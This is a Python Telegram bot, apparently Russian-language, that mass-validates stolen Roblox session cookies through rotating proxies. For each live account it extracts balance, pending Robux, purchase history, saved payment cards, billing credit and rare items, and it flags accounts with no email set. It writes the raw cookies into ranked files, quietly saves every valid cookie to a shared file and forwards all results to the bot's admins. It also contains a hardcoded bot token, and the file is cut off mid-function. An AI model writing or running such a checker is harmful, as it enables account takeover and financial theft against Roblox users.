import os
import json
import logging
import random
import threading
import asyncio
import aiohttp
import zipfile
import queue
import time
from datetime import date, datetime, timedelta
from collections import defaultdict
from pytz import timezone
from aiogram import Bot, Dispatcher, F, Router, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, CallbackQuery, FSInputFile, InputMediaDocument,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.enums import ParseMode
import telebot

# Конфигурация
ADMINS = [6440521056]  # Список ID админов
BOT_TOKEN = '8335283399:AAFpXJAxw54Bilr3FMAuwJtmS7fv4q_wcsU'
DATABASE_DIR = 'Users/'
COOKIE_FILES_DIR = 'filesforcookie/'
PROXIES_FILE = 'proxies.txt'
TARGET_ITEMS = [
    131592085,    # Headless Horseman
    139610147,    # Korblox Deathspeaker
    10159600649,  # 8-Bit Royal Crown
    494291269,    # Super Super Happy Face
    10159610478,  # 8-Bit HP Bar
    1365767       # Valkyrie Helm
]
MAX_RETRIES = 5
CONCURRENT_CHECKS = 50
REQUEST_TIMEOUT = 10

# Словарь для названий редких предметов
RARE_ITEMS_NAMES = {
    131592085: "Headless Horseman",
    139610147: "Korblox Deathspeaker",
    10159600649: "8-Bit Royal Crown",
    494291269: "Super Super Happy Face",
    10159610478: "8-Bit HP Bar",
    1365767: "Valkyrie Helm"
}

# Глобальные переменные
check_queue = queue.Queue()
current_checking = None  # Текущий проверяемый файл (user_id, file_info)
queue_status = {}  # Статус очереди {user_id: position}
sent_queue_notifications = {}  # Отслеживание отправленных уведомлений {user_id: last_notification_position}
active_tasks = set()  # Множество активных задач проверки
queue_task = None  # Задача обработки очереди
validator_queue = queue.Queue()
current_validator_checking = None  # Текущий проверяемый файл в валидаторе
validator_queue_status = {}  # Статус очереди валидатора
validator_sent_notifications = {}  # Уведомления валидатора
validator_active_tasks = set()  # Активные задачи валидатора
validator_task = None  # Задача обработки очереди валидатора

os.makedirs(DATABASE_DIR, exist_ok=True)
os.makedirs(COOKIE_FILES_DIR, exist_ok=True)

class Database:
    @staticmethod
    def register_user(user_id: int, username: str = None) -> tuple:
        user_path = f'{DATABASE_DIR}{user_id}'
        is_new = False
        if not os.path.exists(user_path):
            os.makedirs(f'{user_path}/logs', exist_ok=True)
            is_new = True
            
            config = {
                'cookie_check_count': 0,
                'registration_date': str(date.today()),
                'badges': None,
                'gamepasses': None,
                'username': username,
                'last_activity': str(datetime.now()),
                'total_checks': 0,
                'valid_cookies_found': 0,
                'invalid_cookies_found': 0
            }
            with open(f'{user_path}/config.json', 'w') as f:
                json.dump(config, f, indent=4)
        
        return user_path, is_new

    @staticmethod
    def get_user_config(user_id: int):
        user_path, _ = Database.register_user(user_id)
        with open(f'{user_path}/config.json', 'r') as f:
            return json.load(f)

    @staticmethod
    def update_config(user_id: int, key: str, value):
        user_path, _ = Database.register_user(user_id)  # Исправлено
        config = Database.get_user_config(user_id)
        config[key] = value
        config['last_activity'] = str(datetime.now())
        with open(f'{user_path}/config.json', 'w') as f:
            json.dump(config, f, indent=4)

    @staticmethod
    async def send_startup_message():
        try:  # ← Добавлено двоеточие
            # Уведомление пользователей
            users = Database.get_all_users()
            for user_id in users:
                try:
                    await bot.send_message(user_id, "👋")
                    await bot.send_message(user_id, "Бот включен, наслаждайтесь")
                except Exception as e:
                    logging.error(f"Не удалось отправить сообщение пользователю {user_id}: {e}")

            # Уведомление админов
            for admin_id in ADMINS:
                try:
                    await bot.send_message(
                        admin_id,
                        f"🟢 Бот успешно запущен!\n"
                        f"⏰ Время запуска: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n"
                        f"👥 Всего пользователей: {len(users)}"
                    )
                except Exception as e:
                    logging.error(f"Ошибка отправки статуса админу {admin_id}: {e}")
                    
        except Exception as e:  # ← Исправлен отступ
            logging.error(f"Ошибка в startup уведомлениях: {e}")

    @staticmethod
    def save_proxies(proxies: list):
        with open(PROXIES_FILE, 'w') as f:
            f.write('\n'.join(proxies))

    @staticmethod
    def load_proxies() -> list:
        if os.path.exists(PROXIES_FILE):
            with open(PROXIES_FILE, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        return []

    @staticmethod
    def get_all_users() -> list:
        users = []
        for user_id in os.listdir(DATABASE_DIR):
            if user_id.isdigit():
                users.append(int(user_id))
        return users

    @staticmethod
    def ban_user(user_id: int, reason: str):
        banned_users = Database.load_banned_users()
        banned_users[str(user_id)] = {
            'reason': reason,
            'date': str(date.today()),
            'admin': ADMINS[0]  # ID первого админа
        }
        with open(f'{DATABASE_DIR}banned_users.json', 'w') as f:
            json.dump(banned_users, f, indent=4)

    @staticmethod
    def unban_user(user_id: int):
        banned_users = Database.load_banned_users()
        if str(user_id) in banned_users:
            del banned_users[str(user_id)]
            with open(f'{DATABASE_DIR}banned_users.json', 'w') as f:
                json.dump(banned_users, f, indent=4)

    @staticmethod
    def load_banned_users() -> dict:
        if os.path.exists(f'{DATABASE_DIR}banned_users.json'):
            with open(f'{DATABASE_DIR}banned_users.json', 'r') as f:
                try:
                    return json.load(f)
                except json.JSONDecodeError:
                    return {}
        return {}

    @staticmethod
    def is_user_banned(user_id: int) -> bool:
        banned_users = Database.load_banned_users()
        return str(user_id) in banned_users

    @staticmethod
    def get_ban_reason(user_id: int) -> str:
        banned_users = Database.load_banned_users()
        ban_info = banned_users.get(str(user_id), {})
        return ban_info.get('reason', 'Причина не указана')

class Form(StatesGroup):
    gamepass = State()
    badge = State()
    file = State()
    support_message = State()
    admin_reply = State()
    validator_file = State() 

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
router = Router()

semaphore = asyncio.Semaphore(CONCURRENT_CHECKS)

async def send_startup_message():
    users = Database.get_all_users()
    for user_id in users:
        try:
            await bot.send_message(user_id, "👋")
            await bot.send_message(user_id, "Бот включен, наслаждайтесь")
        except Exception as e:
            logging.error(f"Не удалось отправить сообщение пользователю {user_id}: {e}")

async def log_to_admin(action: str, user_id: int, username: str = None):
    message = (
        f"👤 Пользователь: @{username if username else 'none'} (ID: {user_id})\n"
        f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"💠 Действие: {action}"
    )
    for admin_id in ADMINS:
        try:
            await bot.send_message(admin_id, message)
        except Exception as e:
            logging.error(f"Не удалось отправить сообщение админу {admin_id}: {e}")

async def get_all_time_donate(session: aiohttp.ClientSession, cookie: str, user_id: int, proxy: str = None):
    total_donate = 0
    cursor = ""
    proxy_url = f"http://{proxy}" if proxy else None
    while True:
        try:
                url = f'https://economy.roblox.com/v2/users/{user_id}/transactions'
                params = {
                    "limit": 100,
                    "transactionType": "Purchase",
                    "itemPricingType": "All",
                    "cursor": cursor
                }

                async with session.get(
                    url,
                    params=params,
                    cookies={".ROBLOSECURITY": cookie},
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                ) as response:
                    if response.status == 429:
                        await asyncio.sleep(5)
                        continue

                    data = await response.json()
                    transactions = data.get('data', [])

                    for transaction in transactions:
                        total_donate += transaction.get('currency', {}).get('amount', 0)

                    cursor = data.get('nextPageCursor')
                    if not cursor:
                        break
        except: pass
    if total_donate != 0:
        total_donate = str(total_donate).strip('-')
    return int(total_donate)

async def get_pending_and_donate(cookie: str, user_id: int, proxy: str = None):
    url = f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Year&transactionType=summary'
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                url,
                cookies={".ROBLOSECURITY": cookie.strip()},
                allow_redirects=False,
                proxy=f"http://{proxy}" if proxy else None,
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            ) as response:
                if response.status == 200 and response.content_type == 'application/json':
                    data = await response.json()
                    donate = data.get('purchasesTotal', 0)
                    if donate != 0:
                        donate = str(donate).strip('-')
                    pending = data.get('pendingRobuxTotal', 0)
                    return {
                        "donate": int(donate),
                        "pending": pending
                    }
                else:
                    return {"donate": 0, "pending": 0}
    except Exception as e:
        logging.error(f"Error fetching pending and donate: {e}")
        return {"donate": 0, "pending": 0}

async def check_billing(session: aiohttp.ClientSession, cookie: str, proxy: str = None):
    billing_url = 'https://billing.roblox.com/v1/credit'
    try:
        async with session.get(
            billing_url, 
            cookies={".ROBLOSECURITY": cookie},
            proxy=f"http://{proxy}" if proxy else None,
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        ) as response:
            if response.status == 200:
                data = await response.json()
                balance = data.get('balance', 0)
                currency_code = data.get('currencyCode', 'USD')
                return f"{balance/100:.2f} {currency_code}"
            else:
                return "error"
    except Exception as e:
        logging.error(f"Billing check error: {e}")
        return "error"

async def check_cookie_with_retry(session: aiohttp.ClientSession, cookie: str, badges: list, gamepasses: list, proxies: list):
    retries = 0
    last_error = None
    used_proxies = set()
    
    while retries < MAX_RETRIES:
        proxy = None
        if proxies:
            available_proxies = [p for p in proxies if p not in used_proxies]
            if available_proxies:
                proxy = random.choice(available_proxies)
                used_proxies.add(proxy)
            else:
                used_proxies.clear()
                continue
        
        try:
            async with semaphore:
                result = await check_cookie(session, cookie, badges, gamepasses, proxy)
                if result['status'] == 'valid':
                    return result
                else:
                    last_error = result.get('message', 'Invalid cookie')
        except Exception as e:
            last_error = str(e)
            logging.warning(f"Attempt {retries+1} failed (proxy: {proxy}): {e}")
        
        retries += 1
        if retries < MAX_RETRIES:
            await asyncio.sleep(1)
    
    logging.error(f"All attempts failed: {last_error}")
    return {'status': 'invalid', 'message': last_error}

async def check_cookie(session: aiohttp.ClientSession, cookie: str, badges: list, gamepasses: list, proxy: str = None):
    try:
        proxy_url = f"http://{proxy}" if proxy else None
        
        async with session.get(
            'https://users.roblox.com/v1/users/authenticated',
            cookies={'.ROBLOSECURITY': cookie},
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT),
            proxy=proxy_url
        ) as response:
            if response.status == 401:
                return {'status': 'invalid'}
            if response.status != 200:
                return {'status': 'invalid'}
            
            user_data = await response.json()
            user_id = user_data['id']
            
        async with session.get(
            f'https://users.roblox.com/v1/users/{user_id}',
            cookies={'.ROBLOSECURITY': cookie},
            proxy=proxy_url,
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        ) as response:
            if response.status == 200:
                user_info = await response.json()
                created_str = user_info.get('created')
                creation_date = 'Unknown'
                if created_str:
                    try:
                        dt = datetime.fromisoformat(created_str.replace('Z', '+00:00'))
                        creation_date = dt.strftime('%d.%m.%Y')
                    except:
                        pass
            else:
                creation_date = 'Unknown'
        
        async with session.get(
            'https://www.roblox.com/my/settings/json',
            cookies={'.ROBLOSECURITY': cookie},
            proxy=proxy_url,
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        ) as response:
            settings = await response.json()
            
        async with session.get(
            'https://economy.roblox.com/v1/user/currency',
            cookies={'.ROBLOSECURITY': cookie},
            proxy=proxy_url,
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        ) as response:
            balance_data = await response.json()
            balance = balance_data.get('robux', 0)
            
        pending_donate_data = await get_pending_and_donate(cookie, user_id, proxy)
        donate = pending_donate_data["donate"]
        pending = pending_donate_data["pending"]
            
        # Получаем All-time donate
        all_time_donate = await get_all_time_donate(session, cookie, user_id, proxy)
            
        premium = settings.get('IsPremium', False)
        
        card_url = 'https://apis.roblox.com/payments-gateway/v1/payment-profiles'
        async with session.get(
            card_url,
            cookies={'.ROBLOSECURITY': cookie},
            proxy=proxy_url,
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        ) as response:
            cards = await response.json()
            card = "Last4Digits" in str(cards)
        
        badges_result = []
        if badges:
            for badge in badges:
                while True:
                    try:
                        async with session.get(
                            f'https://inventory.roblox.com/v1/users/{user_id}/items/2/{badge}/is-owned',
                            cookies={'.ROBLOSECURITY': cookie},
                            proxy=proxy_url,
                            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                        ) as response:
                            response = await response.text()
                            if response.lower() == 'true':
                                async with session.get(
                                        f"https://badges.roblox.com/v1/badges/{badge}",
                                        cookies={'.ROBLOSECURITY': cookie},
                                        proxy=proxy_url,
                                        timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)) as name:
                                    name = await name.json()
                                    if name:
                                        badges_result.append(name['name'])
                                        break
                            else:
                                break
                    except Exception as e:
                        print(e)
            badges_result = ', '.join(badges_result) if badges_result else []

        gamepasses_result = []
        if gamepasses:
            for gp in gamepasses:
                while True:
                    try:
                        async with session.get(
                                f'https://inventory.roblox.com/v1/users/{user_id}/items/1/{gp}/is-owned',
                                cookies={'.ROBLOSECURITY': cookie},
                                proxy=proxy_url,
                                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                        ) as response:
                            response = await response.text()
                            if response.lower() == 'true':
                                async with session.get(
                                        f"https://apis.roblox.com/game-passes/v1/game-passes/{gp}/product-info",
                                        cookies={'.ROBLOSECURITY': cookie},
                                        proxy=proxy_url,
                                        timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)) as name:
                                    name = await name.json()
                                    if name:
                                        gamepasses_result.append(name['Name'])
                                        break
                            else:
                                break
                    except Exception as e:
                        print(e)
            gamepasses_result = ', '.join(gamepasses_result) if gamepasses_result else []
        print(gamepasses_result)
        rap = await check_rap(session, user_id, proxy)
        
        rare_items = {}
        for item_id in TARGET_ITEMS:
            async with session.get(
                f'https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{item_id}',
                cookies={'.ROBLOSECURITY': cookie},
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            ) as response:
                data = await response.json()
                if data.get('data', []):
                    rare_items[item_id] = len(data['data'])
        
        billing = await check_billing(session, cookie, proxy)
        
        return {
            'status': 'valid',
            'username': settings.get('Name', 'Unknown'),
            'balance': balance,
            'pending': pending,
            'donate': donate,
            'all_time_donate': all_time_donate,
            'premium': premium,
            'card': card,
            'cards_count': 1 if card else 0,
            'email': settings.get('UserEmailVerified', False),
            'creation_date': creation_date,
            'badges': badges_result,
            'gamepasses': gamepasses_result,
            'rap': rap,
            'rare_items': rare_items,
            'billing': billing,
            'cookie': cookie,
            'proxy_used': proxy
        }
        
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

async def check_rap(session: aiohttp.ClientSession, user_id: int, proxy: str = None):
    total_rap = 0
    next_cursor = None
    proxy_url = f"http://{proxy}" if proxy else None
    
    try:
        while True:
            url = f'https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=100&sortOrder=Asc'
            if next_cursor:
                url += f'&cursor={next_cursor}'
            
            async with session.get(
                url,
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            ) as response:
                if response.status == 429:
                    await asyncio.sleep(1)
                    continue
                    
                data = await response.json()
                
                for item in data.get('data', []):
                    total_rap += item.get('recentAveragePrice', 0)
                
                next_cursor = data.get('nextPageCursor')
                if not next_cursor:
                    break
                    
    except Exception as e:
        logging.error(f"RAP check error: {e}")
    
    return total_rap

async def check_cookie_simple(session: aiohttp.ClientSession, cookie: str, proxies: list = None):
    retries = 0
    last_error = None
    used_proxies = set()
    
    while retries < MAX_RETRIES:
        proxy = None
        if proxies:
            available_proxies = [p for p in proxies if p not in used_proxies]
            if available_proxies:
                proxy = random.choice(available_proxies)
                used_proxies.add(proxy)
            else:
                used_proxies.clear()
                continue
        
        try:
            async with semaphore:
                result = await check_cookie_basic(session, cookie, proxy)
                if result['status'] == 'valid':
                    return result
                else:
                    last_error = result.get('message', 'Invalid cookie')
        except Exception as e:
            last_error = str(e)
            logging.warning(f"Attempt {retries+1} failed (proxy: {proxy}): {e}")
        
        retries += 1
        if retries < MAX_RETRIES:
            await asyncio.sleep(1)
    
    logging.error(f"All attempts failed: {last_error}")
    return {'status': 'invalid', 'message': last_error}

async def check_cookie_basic(session: aiohttp.ClientSession, cookie: str, proxy: str = None):
    try:
        proxy_url = f"http://{proxy}" if proxy else None
        
        async with session.get(
            'https://users.roblox.com/v1/users/authenticated',
            cookies={'.ROBLOSECURITY': cookie},
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT),
            proxy=proxy_url
        ) as response:
            if response.status == 401:
                return {'status': 'invalid'}
            if response.status != 200:
                return {'status': 'invalid'}
            
            return {'status': 'valid', 'cookie': cookie}
            
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

async def create_report_files(stats: dict, user_id: int, timestamp: str):
    user_dir = f'{DATABASE_DIR}{user_id}/checks/{timestamp}/'
    os.makedirs(user_dir, exist_ok=True)

    def create_file(filename, data):
        path = f'{user_dir}{filename}.txt'
        config = Database.get_user_config(user_id)
        badges_enabled = config.get('badges') is not None
        gamepasses_enabled = config.get('gamepasses') is not None
        
        with open(path, 'w', encoding='utf-8') as f:
            for item in data:
                premium_str = 'true' if item['premium'] else 'false'
                card_str = 'true' if item['card'] else 'false'
                mail_str = 'true' if item['email'] else 'false'
                cards_count_str = str(item['cards_count'])
                billing_str = item.get('billing', 'error')
                
                badges_str = 'none'
                if badges_enabled:
                    badges_str = item['badges'] if item['badges'] else 'None'
                
                gamepasses_str = 'none'
                if gamepasses_enabled:
                    gamepasses_str = item['gamepasses'] if item['gamepasses'] else 'None'
                
                rare_items_str = 'none'
                if item['rare_items']:
                    rare_items_str = ', '.join([f"{RARE_ITEMS_NAMES.get(int(item_id), f'Item {item_id}')} ({count})" for item_id, count in item['rare_items'].items()])
                
                line = (
                    f"Name: {item['username']} | "
                    f"Id: {user_id} | "
                    f"Balance: {item['balance']} | "
                    f"Pending: {item['pending']} | "
                    f"Donate: {abs(item['donate'])} | "
                    f"All-time donate: {abs(item['all_time_donate'])} | "
                    f"RAP: {item['rap']} | "
                    f"Billing: {billing_str} | "
                    f"Premium: {premium_str} | "
                    f"Badges: {badges_str} | "
                    f"Passes: {gamepasses_str} | "
                    f"Cards: {card_str} | "
                    f"Mail: {mail_str} | "
                    f"2FA: False | "
                    f"Trade: False | "
                    f"Creation year: {item['creation_date'].split('.')[-1]} | "
                    f"Rare Items: {rare_items_str} | "
                    f"Cookie: {item['cookie']}\n"
                )
                f.write(line)
        return path if os.path.getsize(path) > 0 else None

    files = {}
    if stats['valid_list']:
        files['valid'] = create_file('Valid', stats['valid_list'])
    if stats['total_all_time_donate']:
        files['donate'] = create_file('All_Time_Donate', sorted(stats['all_time_donate_list'], key=lambda x: x['all_time_donate'], reverse=True))
    if stats['balance_list']:
        files['balance'] = create_file('Balance', sorted(stats['balance_list'], key=lambda x: x['balance'], reverse=True))
    if stats['cards_list']:
        files['cards'] = create_file('Cards', stats['cards_list'])
    if stats['badges_list']:
        files['badges'] = create_file('Badges', stats['badges_list'])
    if stats['gamepasses_list']:
        files['gamepasses'] = create_file('Gamepasses', stats['gamepasses_list'])
    if stats['pending_list']:
        files['pending'] = create_file('Pending', sorted(stats['pending_list'], key=lambda x: x['pending'], reverse=True))
    if stats['nomail_list']:
        files['nomail'] = create_file('Nomail', stats['nomail_list'])
    if stats['rap_list']:
        files['rap'] = create_file('RAP', sorted(stats['rap_list'], key=lambda x: x['rap'], reverse=True))
    if stats['rare_items_list']:
        files['rare_items'] = create_file('RareItems', stats['rare_items_list'])
    
    return {k: v for k, v in files.items() if v is not None}

async def generate_report_text(stats: dict, start_time: float):
    rare_items_summary = []
    for item in stats['rare_items_list']:
        if item['rare_items']:
            for item_id, count in item['rare_items'].items():
                item_name = RARE_ITEMS_NAMES.get(int(item_id), f'Item {item_id}')
                rare_items_summary.append(f"{item_name} ({count})")
    
    rare_items_text = ", ".join(rare_items_summary) if rare_items_summary else "Нет редких предметов"
    
    # Формирование текста для биллинга
    billing_summary = []
    for currency, amount in stats['total_billing'].items():
        billing_summary.append(f"{amount:.2f} {currency}")
    billing_text = " + ".join(billing_summary) if billing_summary else "Нет данных"
    
    # Рассчитываем время выполнения
    duration = time.time() - start_time
    minutes = int(duration // 60)
    seconds = int(duration % 60)
    duration_text = f"{minutes} мин {seconds} сек" if minutes > 0 else f"{seconds} сек"
    
    # Получаем московское время
    moscow_tz = timezone('Europe/Moscow')
    moscow_time = datetime.now(moscow_tz).strftime("%Y-%m-%d %H:%M:%S (MSK)")

    return (
        f'📊 <b>ОТЧЕТ ПРОВЕРКИ</b>\n\n'
        f'﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n'
        f'🔹 <b>Общие данные:</b>\n\n'
        f'[✅] • Валидных - <b>{stats["valid"]}</b>\n'
        f'[❌] • Не валидных - <b>{stats["invalid"]}</b>\n'
        f'[♻️] • ️Дубликатов - <b>{stats.get("duplicates", 0)}</b>\n\n'
        f'[💰] • Общий донат -  <b>{abs(stats["total_donate"])} R$</b>\n'
        f'[💸] • All-time донат - <b>{abs(stats["total_all_time_donate"])} R$</b>\n'
        f'[💵] • Общий баланс - <b>{stats["total_balance"]} R$</b>\n'
        f'[🔄] • Общий пендинг - <b>{stats["total_pending"]} R$</b>\n'
        f'[🏷️] • Общий RAP - <b>{stats["total_rap"]} R$</b>\n\n'
        f'[💳] • Карт - <b>{stats["total_cards"]}</b>\n'
        f'[🌟] • Премиум - <b>{stats["premium"]}</b>\n'
        f'[📫️] • Без почты - <b>{len(stats["nomail_list"])}</b>\n\n'
        f'[🎖️] •️ Бейджей - <b>{stats["badges_found"]}</b>\n'
        f'[🎮] • Геймпассов - <b>{stats["gamepasses_found"]}</b>\n\n'
        f'[💳] • Билинг - <b>{billing_text}</b>\n\n'
        f'[🎁] • Редкие предметы - <b>{rare_items_text}</b>\n\n'
        f'⏱ Время начала проверки: <b>{moscow_time}</b>\n'
        f'⏳ Время выполнения: <b>{duration_text}</b>\n'
        f'﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌'
    )

async def send_report_with_files(chat_id: int, report_text: str, files: dict):
    if not files:
        await bot.send_message(chat_id, report_text, parse_mode=ParseMode.HTML)
        return

    try:
        media_group = []
        for i, (file_type, file_path) in enumerate(files.items()):
            caption = report_text if i == 0 else None
            media_group.append(
                InputMediaDocument(
                    media=FSInputFile(file_path),
                    caption=caption,
                    parse_mode=ParseMode.HTML
                )
            )
        
        await bot.send_media_group(chat_id, media=media_group)
    except Exception as e:
        logging.error(f"Ошибка отправки медиа группы: {e}")
        await bot.send_message(chat_id, report_text, parse_mode=ParseMode.HTML)
        for path in files.values():
            await bot.send_document(chat_id, document=FSInputFile(path))

async def generate_report(stats: dict, user_id: int, message: Message, start_time: float):
    try:
        timestamp = datetime.now().strftime("%d%m%Y%H%M%S")
        
        files = await create_report_files(stats, user_id, timestamp)
        report_text = await generate_report_text(stats, start_time)
        
        media_group = []
        for i, (file_type, file_path) in enumerate(files.items()):
            caption = report_text if i == 0 else None
            media_group.append(
                InputMediaDocument(
                    media=FSInputFile(file_path),
                    caption=caption,
                    parse_mode=ParseMode.HTML
                )
            )
        
        await bot.send_media_group(user_id, media=media_group)
        
        user_config = Database.get_user_config(user_id)
        username = user_config.get('username', 'none')
        
        admin_report = (
            f'📤 <b>НОВАЯ ПРОВЕРКА COOKIE</b>\n\n'
            f'﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n'
            f'👤 Пользователь: @{username} (ID: {user_id})\n\n'
            f'{report_text}'
        )
        
        # Отправляем отчет всем админам
        for admin_id in ADMINS:
            await send_report_with_files(admin_id, admin_report, files)
        
        config = Database.get_user_config(user_id)
        Database.update_config(user_id, 'cookie_check_count', config['cookie_check_count'] + 1)
        Database.update_config(user_id, 'total_checks', config.get('total_checks', 0) + stats['valid'] + stats['invalid'])
        Database.update_config(user_id, 'valid_cookies_found', config.get('valid_cookies_found', 0) + stats['valid'])
        Database.update_config(user_id, 'invalid_cookies_found', config.get('invalid_cookies_found', 0) + stats['invalid'])
            
    except Exception as e:
        await message.answer(
            f"<b>❌ Ошибка генерации отчета:</b>\n<code>{str(e)}</code>",
            parse_mode=ParseMode.HTML
        )
        logging.error(f"Ошибка генерации отчета: {e}")

async def process_queue():
    global current_checking, active_tasks
    while True:
        if not check_queue.empty() and current_checking is None:
            current_checking = check_queue.get()
            user_id, file_info, message = current_checking
            start_time = time.time()  # Записываем время начала
            
            try:
                config = Database.get_user_config(user_id)
                badges = config.get('badges', [])
                gamepasses = config.get('gamepasses', [])
                proxies = Database.load_proxies()
                
                stats = {
                    'valid': 0,
                    'invalid': 0,
                    'duplicates': file_info.get('duplicates', 0),
                    'total_balance': 0,
                    'total_donate': 0,
                    'total_all_time_donate': 0,
                    'total_pending': 0,
                    'total_rap': 0,
                    'total_billing': defaultdict(float),
                    'premium': 0,
                    'total_cards': 0,
                    'badges_found': 0,
                    'gamepasses_found': 0,
                    'valid_list': [],
                    'balance_list': [],
                    'cards_list': [],
                    'all_time_donate_list': [],
                    'badges_list': [],
                    'gamepasses_list': [],
                    'pending_list': [],
                    'nomail_list': [],
                    'rap_list': [],
                    'rare_items_list': []
                }
                
                await message.edit_text(
                    "<b>⏳ Начинаю проверку куки... Это может занять время.</b>\n\n"
                    f"<b>Всего куки:</b> {len(file_info['cookies'])}\n"
                    f"<b>Дубликатов удалено:</b> {file_info.get('duplicates', 0)}\n"
                    f"<b>Используется прокси:</b> {len(proxies) if proxies else 'Нет'}",
                    parse_mode=ParseMode.HTML
                )
                
                async with aiohttp.ClientSession() as session:
                    tasks = []
                    for cookie in file_info['cookies']:
                        task = asyncio.create_task(
                            check_cookie_with_retry(session, cookie, badges, gamepasses, proxies)
                        )
                        tasks.append(task)
                        active_tasks.add(task)
                    
                    for i, future in enumerate(asyncio.as_completed(tasks)):
                        try:
                            result = await future
                            
                            if (i+1) % max(len(file_info['cookies'])//10, 10) == 0 or (i+1) == len(file_info['cookies']):
                                progress = (i+1)/len(file_info['cookies'])*100
                                await message.edit_text(
                                    f"<b>⏳ Проверка в процессе...</b>\n\n"
                                    f"<b>Прогресс:</b> {i+1}/{len(file_info['cookies'])} ({progress:.1f}%)\n"
                                    f"<b>Валидных:</b> {stats['valid']}\n"
                                    f"<b>Невалидных:</b> {stats['invalid']}",
                                    parse_mode=ParseMode.HTML
                                )
                            
                            if result['status'] == 'valid':
                                stats['valid'] += 1
                                stats['total_balance'] += result['balance']
                                stats['total_donate'] += result['donate']
                                stats['total_all_time_donate'] += result['all_time_donate']
                                stats['total_pending'] += result['pending']
                                stats['total_rap'] += result['rap']

                                billing = result.get('billing', 'error')
                                if billing != 'error':
                                    try:
                                        amount, currency = billing.split()
                                        stats['total_billing'][currency] += float(amount)
                                    except Exception as e:
                                        logging.error(f"Ошибка обработки биллинга: {e}")
                                if result['premium']:
                                    stats['premium'] += 1
                                if result['card']:
                                    stats['total_cards'] += 1
                                    stats['cards_list'].append(result)
                                if result['badges']:
                                    stats['badges_found'] += len(result['badges'])
                                    stats['badges_list'].append(result)
                                if result['gamepasses']:
                                    stats['gamepasses_found'] += len(result['gamepasses'])
                                    stats['gamepasses_list'].append(result)
                                if result['pending'] > 0:
                                    stats['pending_list'].append(result)
                                if not result['email']:
                                    stats['nomail_list'].append(result)
                                if result['rap'] > 0:
                                    stats['rap_list'].append(result)
                                if result['rare_items']:
                                    stats['rare_items_list'].append(result)
                                print(result)
                                if int(result['all_time_donate']) > 0:
                                    stats['all_time_donate_list'].append(result)
                                if result['balance'] > 0:
                                    stats['balance_list'].append(result)
                                stats['valid_list'].append(result)

                                valid_cookies = set()
                                if os.path.exists('all_valid_cookies.txt'):
                                    with open('all_valid_cookies.txt', 'r', encoding='utf-8') as f:
                                        valid_cookies.update(line.strip() for line in f if line.strip())
                                
                                if result['cookie'] not in valid_cookies:
                                    with open('all_valid_cookies.txt', 'a', encoding='utf-8') as f:
                                        f.write(result['cookie'] + '\n')
                            else:
                                stats['invalid'] += 1
                        except asyncio.CancelledError:
                            logging.info(f"Проверка куки отменена для пользователя {user_id}")
                            await message.edit_text(
                                "<b>❌ Проверка отменена администратором</b>\n\n"
                                "Все текущие проверки были остановлены.",
                                parse_mode=ParseMode.HTML
                            )
                            break
                        except Exception as e:
                            logging.error(f"Ошибка при проверке куки: {e}")
                            stats['invalid'] += 1
                        finally:
                            if future in active_tasks:
                                active_tasks.remove(future)
                
                if stats['valid'] > 0:
                    await generate_report(stats, user_id, message, start_time)
                else:
                    await message.edit_text(
                        "<b>❌ В файле не найдено валидных cookies. Проверьте формат файла.</b>",
                        parse_mode=ParseMode.HTML
                    )
                
            except asyncio.CancelledError:
                await message.edit_text(
                    "<b>❌ Проверка отменена администратором</b>\n\n"
                    "Все текущие проверки были остановлены.",
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                await message.edit_text(
                    f"<b>❌ Ошибка обработки куки:</b>\n<code>{str(e)}</code>",
                    parse_mode=ParseMode.HTML
                )
                logging.error(f"Ошибка обработки куки: {e}")
            finally:
                current_checking = None
                queue_status.pop(user_id, None)
                sent_queue_notifications.pop(user_id, None)
                await notify_queue_update()
        
        await asyncio.sleep(1)

async def notify_queue_update():
    global sent_queue_notifications
    
    temp_queue = list(check_queue.queue)
    current_positions = {}
    
    for idx, (user_id, _, _) in enumerate(temp_queue, start=1):
        current_positions[user_id] = idx
    
    for user_id in list(sent_queue_notifications.keys()):
        if user_id not in current_positions:
            sent_queue_notifications.pop(user_id, None)
    
    for user_id, position in current_positions.items():
        last_notified_position = sent_queue_notifications.get(user_id, 0)
        
        if (position != last_notified_position or 
            user_id not in sent_queue_notifications or
            position == 1):
            
            try:
                if position == 1:
                    msg = (
